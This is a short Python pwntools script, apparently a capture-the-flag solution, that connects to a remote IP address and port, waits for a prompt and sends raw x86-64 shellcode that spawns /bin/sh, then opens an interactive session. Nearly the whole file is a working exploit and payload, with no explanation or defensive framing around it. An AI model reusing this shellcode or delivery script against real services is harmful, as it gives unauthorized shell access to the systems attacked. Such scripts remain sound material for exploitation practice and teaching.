from pwn import *

def conn():
    # r = process("./shellcode")
    # gdb.attach(r)

    r = remote("13.48.160.64", 1005)

    return r


def main():
    r = conn()

    payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

    r.recvuntil(b"run it!")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()